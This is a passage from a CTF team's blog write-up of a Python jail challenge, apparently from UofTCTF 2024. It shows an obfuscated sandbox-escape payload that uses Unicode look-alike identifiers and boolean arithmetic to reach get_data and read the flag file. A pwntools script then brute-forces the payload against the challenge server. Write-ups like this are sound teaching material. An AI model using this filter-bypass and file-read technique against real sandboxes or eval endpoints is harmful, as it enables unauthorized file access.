style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)]<span style="color:#f92672">.</span>𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(<span style="color:#e6db74">&#39;.&#39;</span>,()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)]<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">!=</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)]<span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)]<span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>_<span style="color:#960050;background-color:#1e0010">＿</span>𝖉𝖔𝖈_<span style="color:#960050;background-color:#1e0010">＿</span>[(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)<span style="color:#f92672">+</span>(<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span>)])
+</code></pre></div><p>That&rsquo;s it! Now with it working locally, we just need to test it on the server. Remember that the index <code>121</code> for the <code>get_data</code> function I&rsquo;ve been using may be different on the remote machine, so we need to brute force it. Besides that, the payload is essentially the same.</p>
+<p><strong>Python Solution:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># This function prints the sum of n identical expressions which evaluate to True</span>
+<span style="color:#75715e"># The purpose of this is to construct any number (True + True == 2, etc.) without</span>
+<span style="color:#75715e"># explicitly using alphanumeric characters</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">printTrue</span>(n):
+    s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+        s <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;(&#39;&#39;==&#39;&#39;)+&#34;</span>
+    <span style="color:#66d9ef">return</span> s[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+
+<span style="color:#75715e"># This spells out &#39;flag&#39; (according to the Dockerfile, the flag is stored in &#39;flag&#39;)</span>
+code2 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;()._＿𝖉𝖔𝖈_＿[(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)]+(&#39;&#39;!=&#39;&#39;)._＿𝖉𝖔𝖈_＿[(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)]+()._＿𝖉𝖔𝖈_＿[(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)]+()._＿𝖉𝖔𝖈_＿[(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)+(&#39;&#39;==&#39;&#39;)]&#34;</span>
+
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">400</span>): <span style="color:#75715e"># Brute force the index of the builtins subclass (it is almost certainly different on local than remote)</span>
+    
+    <span style="color:#75715e"># Connect to server and construct payload</span>
+    r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;35.222.133.12&#39;</span>, <span style="color:#ae81ff">5000</span>)
+    code1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;()._＿𝖈𝖑𝖆𝖘𝖘_＿._＿𝖇𝖆𝖘𝖊𝖘_＿[&#39;&#39;==&#39;𝖈&#39;]._＿𝖘𝖚𝖇𝖈𝖑𝖆𝖘𝖘𝖊𝖘_＿()[&#34;</span> <span style="color:#f92672">+</span> printTrue(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;].𝖌𝖊𝖙_𝖉𝖆𝖙𝖆(&#39;.&#39;,&#34;</span>
+    code <span style="color:#f92672">=</span> code1 <span style="color:#f92672">+</span> code2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span>
+
+    <span style="color:#75715e"># Send payload and retrieve the flag</span>
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&gt;&#39;</span>)
+    r<span style="color:#f92672">.</span>sendline(code<span style="color:#f92672">.</span>encode())
+    line <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>rstrip()<span style="color:#f92672">.</span>decode()
+
+    <span style="color:#75715e"># If we found the flag, then print it</span>
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;uoft&#39;</span> <span style="color:#f92672">in</span> line:
+        print(line<span style="color:#f92672">.</span>rstrip())
+        r<span style="color:#f92672">.</span>close()
+        exit()
+    r<span style="color:#f92672">.</span>close()
+</code></pre></div><p><strong>Flag:</strong> <code>uoftctf{zero_security_too_apparently_lmao}</code></p>
+<p>Thanks for reading!</p>
+<p><img src="./images/leo.gif" alt="gif3"></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://l3ak.team/posts/irisctf/">
+                <span class="button__text">IrisCTF 2024 - [The Maze] - Rev</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>⛳</span>
+    
+      <span>L3ak 2024</span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
